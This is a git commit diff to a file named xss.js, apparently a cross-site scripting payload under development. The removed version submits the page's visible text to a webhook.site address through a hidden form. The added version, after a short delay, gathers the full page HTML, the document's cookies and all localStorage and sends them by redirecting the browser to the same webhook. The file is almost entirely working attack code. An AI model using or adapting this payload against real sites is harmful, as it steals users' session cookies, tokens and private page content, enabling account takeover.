f76bf42ec9deb1c7e4bb26b797d29ae7bb16b510
abhinav-adobe <akalpathy@adobe.com>
2025-06-25 14:01:31 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,9 +1,9 @@
-let f = document.createElement('form');
-f.action = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c';
-f.method = 'POST';
-let i = document.createElement('input');
-i.name = 'dump';
-i.value = document.body.innerText;
-f.appendChild(i);
-document.body.appendChild(f);
-f.submit();
+setTimeout(() => {
+  const body = document.documentElement.innerHTML;
+  const cookies = document.cookie;
+  const ls = JSON.stringify(localStorage);
+
+  const combined = 'DOM=' + encodeURIComponent(body) + '&COOKIE=' + encodeURIComponent(cookies) + '&LS=' + encodeURIComponent(ls);
+
+  location.href = 'https://webhook.site/c68e80c2-5c60-46d0-ace5-00dc5ec9957c?' + combined;
+}, 500);
